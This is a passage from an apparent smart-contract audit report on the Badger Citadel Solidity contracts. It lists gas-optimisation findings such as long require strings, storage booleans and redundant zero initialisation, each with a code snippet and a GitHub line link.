i <= endingEpoch; i++) {\r\n```\r\n\r\n### `require()`/`revert()` strings longer than 32 bytes cost extra gas\r\n\r\n1. File: src/CitadelMinter.sol (lines [299-302](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L299-L302))\r\n```solidity\r\n        require(\r\n            _fundingBps + _stakingBps + _lockingBps == MAX_BPS,\r\n            \"CitadelMinter: Sum of propvalues must be 10000 bps\"\r\n        );\r\n```\r\n2. File: src/CitadelMinter.sol (lines [319-322](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L319-L322))\r\n```solidity\r\n        require(\r\n            lastMintTimestamp == 0,\r\n            \"CitadelMinter: last mint timestamp already initialized\"\r\n        );\r\n```\r\n3. File: src/CitadelMinter.sol (lines [326-329](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L326-L329))\r\n```solidity\r\n        require(\r\n            globalStartTimestamp != 0,\r\n            \"CitadelMinter: supply schedule start not initialized\"\r\n        );\r\n```\r\n4. File: src/CitadelMinter.sol (lines [368-371](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L368-L371))\r\n```solidity\r\n        require(\r\n            fundingPools.remove(_pool),\r\n            \"CitadelMinter: funding pool does not exist for removal\"\r\n        );\r\n```\r\n5. File: src/CitadelMinter.sol (lines [375-378](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L375-L378))\r\n```solidity\r\n        require(\r\n            fundingPools.add(_pool),\r\n            \"CitadelMinter: funding pool already exists\"\r\n        );\r\n```\r\n6. File: src/Funding.sol (lines [146-149](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L146-L149))\r\n```solidity\r\n        require(\r\n            citadelPriceFlag == false,\r\n            \"Funding: citadel price from oracle flagged and pending review\"\r\n        );\r\n```\r\n7. File: src/Funding.sol (lines [296-299](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L296-L299))\r\n```solidity\r\n        require(\r\n            _assetCap > funding.assetCumulativeFunded,\r\n            \"cannot decrease cap below global sum of assets in\"\r\n        );\r\n```\r\n8. File: src/Funding.sol (lines [323-326](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L323-L326))\r\n```solidity\r\n        require(\r\n            _token != address(asset),\r\n            \"cannot sweep funding asset, use claimAssetToTreasury()\"\r\n        );\r\n```\r\n9. File: src/Funding.sol (lines [388-391](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L388-L391))\r\n```solidity\r\n        require(\r\n            _saleRecipient != address(0),\r\n            \"Funding: sale recipient should not be zero\"\r\n        );\r\n```\r\n10. File: src/GlobalAccessControl.sol (lines [116-119](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L116-L119))\r\n```solidity\r\n        require(\r\n            keccak256(bytes(roleString)) == role,\r\n            \"Role string and role do not match\"\r\n        );\r\n```\r\n11. File: src/KnightingRound.sol (lines [120-123](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L120-L123))\r\n```solidity\r\n        require(\r\n            _saleStart >= block.timestamp,\r\n            \"KnightingRound: start date may not be in the past\"\r\n        );\r\n```\r\n12. File: src/KnightingRound.sol (lines [124-127](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L124-L127))\r\n```solidity\r\n        require(\r\n            _saleDuration > 0,\r\n            \"KnightingRound: the sale duration must not be zero\"\r\n        );\r\n```\r\n13. File: src/KnightingRound.sol (lines [128-131](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L128-L131))\r\n```solidity\r\n        require(\r\n            _tokenOutPrice > 0,\r\n            \"KnightingRound: the price must not be zero\"\r\n        );\r\n```\r\n14. File: src/KnightingRound.sol (lines [132-135](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L132-L135))\r\n```solidity\r\n        require(\r\n            _saleRecipient != address(0),\r\n            \"KnightingRound: sale recipient should not be zero\"\r\n        );\r\n```\r\n15. File: src/KnightingRound.sol (line [273](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L273))\r\n```solidity\r\n        require(!finalized, \"KnightingRound: already finalized\");\r\n```\r\n16. File: src/KnightingRound.sol (lines [275-278](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L275-L278))\r\n```solidity\r\n        require(\r\n            tokenOut.balanceOf(address(this)) >= totalTokenOutBought,\r\n            \"KnightingRound: not enough balance\"\r\n        );\r\n```\r\n17. File: src/KnightingRound.sol (lines [293-296](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L293-L296))\r\n```solidity\r\n        require(\r\n            _saleStart >= block.timestamp,\r\n            \"KnightingRound: start date may not be in the past\"\r\n        );\r\n```\r\n18. File: src/KnightingRound.sol (line [297](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L297))\r\n```solidity\r\n        require(!finalized, \"KnightingRound: already finalized\");\r\n```\r\n19. File: src/KnightingRound.sol (lines [312-315](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L312-L315))\r\n```solidity\r\n        require(\r\n            _saleDuration > 0,\r\n            \"KnightingRound: the sale duration must not be zero\"\r\n        );\r\n```\r\n20. File: src/KnightingRound.sol (line [316](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L316))\r\n```solidity\r\n        require(!finalized, \"KnightingRound: already finalized\");\r\n```\r\n21. File: src/KnightingRound.sol (lines [331-334](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L331-L334))\r\n```solidity\r\n        require(\r\n            _tokenOutPrice > 0,\r\n            \"KnightingRound: the price must not be zero\"\r\n        );\r\n```\r\n22. File: src/KnightingRound.sol (lines [349-352](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L349-L352))\r\n```solidity\r\n        require(\r\n            _saleRecipient != address(0),\r\n            \"KnightingRound: sale recipient should not be zero\"\r\n        );\r\n```\r\n23. File: src/KnightingRound.sol (line [384](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L384))\r\n```solidity\r\n        require(!finalized, \"KnightingRound: already finalized\");\r\n```\r\n24. File: src/lib/GlobalAccessControlManaged.sol (lines [62-65](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/GlobalAccessControlManaged.sol#L62-L65))\r\n```solidity\r\n        require(\r\n            gac.hasRole(role, msg.sender) || msg.sender == account,\r\n            \"GAC: invalid-caller-role-or-address\"\r\n        );\r\n```\r\n25. File: src/lib/SafeERC20.sol (lines [55-58](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/SafeERC20.sol#L55-L58))\r\n```solidity\r\n        require(\r\n            (value == 0) || (token.allowance(address(this), spender) == 0),\r\n            \"SafeERC20: approve from non-zero to non-zero allowance\"\r\n        );\r\n```\r\n26. File: src/lib/SafeERC20.sol (line [78](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/SafeERC20.sol#L78))\r\n```solidity\r\n            require(oldAllowance >= value, \"SafeERC20: decreased allowance below zero\");\r\n```\r\n27. File: src/lib/SafeERC20.sol (line [98](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/lib/SafeERC20.sol#L98))\r\n```solidity\r\n            require(abi.decode(returndata, (bool)), \"SafeERC20: ERC20 operation did not succeed\");\r\n```\r\n28. File: src/StakedCitadel.sol (lines [190-193](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L190-L193))\r\n```solidity\r\n        require(\r\n            _feeConfig[0] <= PERFORMANCE_FEE_HARD_CAP,\r\n            \"performanceFeeGovernance too high\"\r\n        );\r\n```\r\n29. File: src/StakedCitadel.sol (lines [194-197](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L194-L197))\r\n```solidity\r\n        require(\r\n            _feeConfig[1] <= PERFORMANCE_FEE_HARD_CAP,\r\n            \"performanceFeeStrategist too high\"\r\n        );\r\n```\r\n30. File: src/StakedCitadel.sol (lines [506-509](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L506-L509))\r\n```solidity\r\n            require(\r\n                IStrategy(strategy).balanceOf() == 0,\r\n                \"Please withdrawToVault before changing strat\"\r\n            );\r\n```\r\n31. File: src/StakedCitadel.sol (lines [535-538](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L535-L538))\r\n```solidity\r\n        require(\r\n            _fees <= PERFORMANCE_FEE_HARD_CAP,\r\n            \"performanceFeeStrategist too high\"\r\n        );\r\n```\r\n32. File: src/StakedCitadel.sol (lines [630-633](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L630-L633))\r\n```solidity\r\n        require(\r\n            _performanceFeeStrategist <= maxPerformanceFee,\r\n            \"Excessive strategist performance fee\"\r\n        );\r\n```\r\n33. File: src/StakedCitadel.sol (lines [650-653](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L650-L653))\r\n```solidity\r\n        require(\r\n            _performanceFeeGovernance <= maxPerformanceFee,\r\n            \"Excessive governance performance fee\"\r\n        );\r\n```\r\n34. File: src/StakedCitadelVester.sol (line [137](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L137))\r\n```solidity\r\n        require(msg.sender == vault, \"StakedCitadelVester: only xCTDL vault\");\r\n```\r\n35. File: src/StakedCitadelVester.sol (line [138](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L138))\r\n```solidity\r\n        require(_amount > 0, \"StakedCitadelVester: cannot vest 0\");\r\n```\r\n36. File: src/SupplySchedule.sol (lines [60-63](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L60-L63))\r\n```solidity\r\n        require(\r\n            globalStartTimestamp > 0,\r\n            \"SupplySchedule: minting not started\"\r\n        );\r\n```\r\n37. File: src/SupplySchedule.sol (lines [90-93](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L90-L93))\r\n```solidity\r\n        require(\r\n            cachedGlobalStartTimestamp > 0,\r\n            \"SupplySchedule: minting not started\"\r\n        );\r\n```\r\n38. File: src/SupplySchedule.sol (lines [94-97](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L94-L97))\r\n```solidity\r\n        require(\r\n            block.timestamp > lastMintTimestamp,\r\n            \"SupplySchedule: already minted up to current block\"\r\n        );\r\n```\r\n39. File: src/SupplySchedule.sol (lines [137-140](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L137-L140))\r\n```solidity\r\n        require(\r\n            globalStartTimestamp == 0,\r\n            \"SupplySchedule: minting already started\"\r\n        );\r\n```\r\n40. File: src/SupplySchedule.sol (lines [141-144](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L141-L144))\r\n```solidity\r\n        require(\r\n            _globalStartTimestamp >= block.timestamp,\r\n            \"SupplySchedule: minting must start at or after current time\"\r\n        );\r\n```\r\n41. File: src/SupplySchedule.sol (lines [155-158](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L155-L158))\r\n```solidity\r\n        require(\r\n            epochRate[_epoch] == 0,\r\n            \"SupplySchedule: rate already set for given epoch\"\r\n        );\r\n```\r\n42. File: src/SupplySchedule.sol (lines [179-182](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L179-L182))\r\n```solidity\r\n        require(\r\n            globalStartTimestamp > 0,\r\n            \"SupplySchedule: minting not started\"\r\n        );\r\n```\r\n43. File: src/SupplySchedule.sol (lines [183-186](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L183-L186))\r\n```solidity\r\n        require(\r\n            lastMintTimestamp > globalStartTimestamp,\r\n            \"SupplySchedule: attempting to mint before start block\"\r\n        );\r\n```\r\n44. File: src/SupplySchedule.sol (lines [187-190](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L187-L190))\r\n```solidity\r\n        require(\r\n            block.timestamp > lastMintTimestamp,\r\n            \"SupplySchedule: already minted up to current block\"\r\n        );\r\n```\r\n\r\n### Not using the named return variables when a function returns, wastes deployment gas\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [277](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L277))\r\n```solidity\r\n        return balances[_user].boosted;\r\n```\r\n2. File: external/StakedCitadelLocker.sol (line [282](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L282))\r\n```solidity\r\n        return balances[_user].locked;\r\n```\r\n3. File: external/StakedCitadelLocker.sol (line [350](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L350))\r\n```solidity\r\n            return locks[locksLength - 1].boosted;\r\n```\r\n4. File: external/StakedCitadelLocker.sol (line [353](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L353))\r\n```solidity\r\n        return 0;\r\n```\r\n5. File: external/StakedCitadelLocker.sol (line [368](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L368))\r\n```solidity\r\n                return locks[i].boosted;\r\n```\r\n6. File: external/StakedCitadelLocker.sol (line [375](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L375))\r\n```solidity\r\n        return 0;\r\n```\r\n7. File: external/StakedCitadelLocker.sol (line [435](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L435))\r\n```solidity\r\n                return mid;\r\n```\r\n8. File: external/StakedCitadelLocker.sol (line [442](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L442))\r\n```solidity\r\n        return min;\r\n```\r\n9. File: external/StakedCitadelLocker.sol (line [471](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L471))\r\n```solidity\r\n        return (userBalance.locked, unlockable, locked, lockData);\r\n```\r\n10. File: external/StakedCitadelLocker.sol (line [471](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L471))\r\n```solidity\r\n        return (userBalance.locked, unlockable, locked, lockData);\r\n```\r\n11. File: external/StakedCitadelLocker.sol (line [471](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L471))\r\n```solidity\r\n        return (userBalance.locked, unlockable, locked, lockData);\r\n```\r\n12. File: external/StakedCitadelLocker.sol (line [471](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L471))\r\n```solidity\r\n        return (userBalance.locked, unlockable, locked, lockData);\r\n```\r\n\r\n### Remove unused local variable\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [735](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L735))\r\n```solidity\r\n        uint256 balance = stakingToken.balanceOf(address(this));\r\n```\r\n\r\n### Using `bool`s for storage incurs overhead\r\n```solidity\r\n    // Booleans are more expensive than uint256 or any type that takes up a full\r\n    // word because each write operation emits an extra SLOAD to first read the\r\n    // slot's contents, replace the bits taken up by the boolean, and then write\r\n    // back. This is the compiler's defense against contract upgrades and\r\n    // pointer aliasing, and it cannot be disabled.\r\n```\r\nhttps://github.com/OpenZeppelin/openzeppelin-contracts/blob/58f635312aa21f947cae5f8578638a85aa2519f5/contracts/security/ReentrancyGuard.sol#L23-L27\r\n\r\n1. File: external/StakedCitadelLocker.sol (line [76](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L76))\r\n```solidity\r\n    mapping(address => mapping(address => bool)) public rewardDistributors;\r\n```\r\n2. File: external/StakedCitadelLocker.sol (line [112](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L112))\r\n```solidity\r\n    bool public isShutdown = false;\r\n```\r\n3. File: src/Funding.sol (line [39](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L39))\r\n```solidity\r\n    bool public citadelPriceFlag; /// Flag citadel price for review by guardian if it exceeds min and max bounds;\r\n```\r\n4. File: src/GlobalAccessControl.sol (line [51](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/GlobalAccessControl.sol#L51))\r\n```solidity\r\n    bool public transferFromDisabled; // Set to true in initialize\r\n```\r\n5. File: src/KnightingRound.sol (line [40](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L40))\r\n```solidity\r\n    bool public finalized;\r\n```\r\n6. File: src/KnightingRound.sol (line [51](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L51))\r\n```solidity\r\n    mapping(address => bool) public hasClaimed;\r\n```\r\n7. File: src/StakedCitadel.sol (line [75](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadel.sol#L75))\r\n```solidity\r\n    bool public pausedDeposit; // false by default Allows to only block deposits, use pause for the normal pause state\r\n```\r\n\r\n### Using `> 0` costs more gas than `!= 0` when used on a `uint` in a `require()` statement\r\n\r\n1. File: external/MedianOracle.sol (line [69](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L69))\r\n```solidity\r\n        require(minimumProviders_ > 0);\r\n```\r\n2. File: external/MedianOracle.sol (line [109](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L109))\r\n```solidity\r\n        require(minimumProviders_ > 0);\r\n```\r\n3. File: external/MedianOracle.sol (line [123](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L123))\r\n```solidity\r\n        require(timestamps[0] > 0);\r\n```\r\n4. File: external/StakedCitadelLocker.sol (line [526](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L526))\r\n```solidity\r\n        require(_amount > 0, \"Cannot stake 0\");\r\n```\r\n5. File: external/StakedCitadelLocker.sol (line [681](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L681))\r\n```solidity\r\n        require(locked > 0, \"no exp locks\");\r\n```\r\n6. File: external/StakedCitadelLocker.sol (line [813](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L813))\r\n```solidity\r\n        require(_reward > 0, \"No reward\");\r\n```\r\n7. File: src/CitadelMinter.sol (line [343](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/CitadelMinter.sol#L343))\r\n```solidity\r\n        require(length > 0, \"CitadelMinter: no funding pools\");\r\n```\r\n8. File: src/Funding.sol (line [170](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L170))\r\n```solidity\r\n        require(_assetAmountIn > 0, \"_assetAmountIn must not be 0\");\r\n```\r\n9. File: src/Funding.sol (line [322](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L322))\r\n```solidity\r\n        require(amount > 0, \"nothing to sweep\");\r\n```\r\n10. File: src/Funding.sol (line [340](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L340))\r\n```solidity\r\n        require(amount > 0, \"nothing to claim\");\r\n```\r\n11. File: src/Funding.sol (line [424](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L424))\r\n```solidity\r\n        require(_citadelPriceInAsset > 0, \"citadel price must not be zero\");\r\n```\r\n12. File: src/Funding.sol (line [452](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/Funding.sol#L452))\r\n```solidity\r\n        require(_citadelPriceInAsset > 0, \"citadel price must not be zero\");\r\n```\r\n13. File: src/interfaces/convex/BoringMath.sol (line [20](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/convex/BoringMath.sol#L20))\r\n```solidity\r\n        require(b > 0, \"BoringMath: division by zero\");\r\n```\r\n14. File: src/interfaces/convex/BoringMath.sol (line [102](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/convex/BoringMath.sol#L102))\r\n```solidity\r\n        require(b > 0, \"BoringMath: division by zero\");\r\n```\r\n15. File: src/interfaces/convex/BoringMath.sol (line [122](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/convex/BoringMath.sol#L122))\r\n```solidity\r\n        require(b > 0, \"BoringMath: division by zero\");\r\n```\r\n16. File: src/interfaces/convex/BoringMath.sol (line [142](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/interfaces/convex/BoringMath.sol#L142))\r\n```solidity\r\n        require(b > 0, \"BoringMath: division by zero\");\r\n```\r\n17. File: src/KnightingRound.sol (lines [124-127](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L124-L127))\r\n```solidity\r\n        require(\r\n            _saleDuration > 0,\r\n            \"KnightingRound: the sale duration must not be zero\"\r\n        );\r\n```\r\n18. File: src/KnightingRound.sol (lines [128-131](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L128-L131))\r\n```solidity\r\n        require(\r\n            _tokenOutPrice > 0,\r\n            \"KnightingRound: the price must not be zero\"\r\n        );\r\n```\r\n19. File: src/KnightingRound.sol (line [172](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L172))\r\n```solidity\r\n        require(_tokenInAmount > 0, \"_tokenInAmount should be > 0\");\r\n```\r\n20. File: src/KnightingRound.sol (line [215](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L215))\r\n```solidity\r\n        require(tokenOutAmount_ > 0, \"nothing to claim\");\r\n```\r\n21. File: src/KnightingRound.sol (lines [312-315](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L312-L315))\r\n```solidity\r\n        require(\r\n            _saleDuration > 0,\r\n            \"KnightingRound: the sale duration must not be zero\"\r\n        );\r\n```\r\n22. File: src/KnightingRound.sol (lines [331-334](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L331-L334))\r\n```solidity\r\n        require(\r\n            _tokenOutPrice > 0,\r\n            \"KnightingRound: the price must not be zero\"\r\n        );\r\n```\r\n23. File: src/KnightingRound.sol (line [411](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/KnightingRound.sol#L411))\r\n```solidity\r\n        require(amount > 0, \"nothing to sweep\");\r\n```\r\n24. File: src/StakedCitadelVester.sol (line [138](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/StakedCitadelVester.sol#L138))\r\n```solidity\r\n        require(_amount > 0, \"StakedCitadelVester: cannot vest 0\");\r\n```\r\n25. File: src/SupplySchedule.sol (lines [60-63](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L60-L63))\r\n```solidity\r\n        require(\r\n            globalStartTimestamp > 0,\r\n            \"SupplySchedule: minting not started\"\r\n        );\r\n```\r\n26. File: src/SupplySchedule.sol (lines [90-93](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L90-L93))\r\n```solidity\r\n        require(\r\n            cachedGlobalStartTimestamp > 0,\r\n            \"SupplySchedule: minting not started\"\r\n        );\r\n```\r\n27. File: src/SupplySchedule.sol (lines [179-182](https://github.com/code-423n4/2022-04-badger-citadel/blob/dab143a990a9c355578fbb15cd3c884614e33f42/src/SupplySchedule.sol#L179-L182))\r\n```solidity\r\n        require(\r\n            globalStartTimestamp > 0,\r\n            \"SupplySchedule: minting not started\"\r\n        );\r\n```\r\n\r\n### It costs more gas to initialize variables to zero than to let the default of zero be applied\r\n\r\n1. File: external/MedianOracle.sol (line [160](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L160))\r\n```solidity\r\n        uint256 size = 0;\r\n```\r\n2. File: external/MedianOracle.sol (line [164](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L164))\r\n```solidity\r\n        for (uint256 i = 0; i < reportsCount; i++) {\r\n```\r\n3. File: external/MedianOracle.sol (line [226](https://github.com/ampleforth/market-oracle/blob/5e7fd1506784f074748ab6bd5df740ca2227b14f/contracts/MedianOracle.sol#L226))\r\n```solidity\r\n        for (uint256 i = 0; i < providers.length; i++) {\r\n```\r\n4. File: external/StakedCitadelLocker.sol (line [267](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L267))\r\n```solidity\r\n        for (uint256 i = 0; i < userRewards.length; i++) {\r\n```\r\n5. File: external/StakedCitadelLocker.sol (line [423](https://github.com/Citadel-DAO/staked-citadel-locker/blob/980088335adf7fdc62aa9a0c2556b37c01605dd4/src/StakedCitadelLocker.sol#L423))\r\n```solidity\r\n        uint256 min = 0;\r\n```\r\n6. File: external/StakedCitadelLocker.sol (line 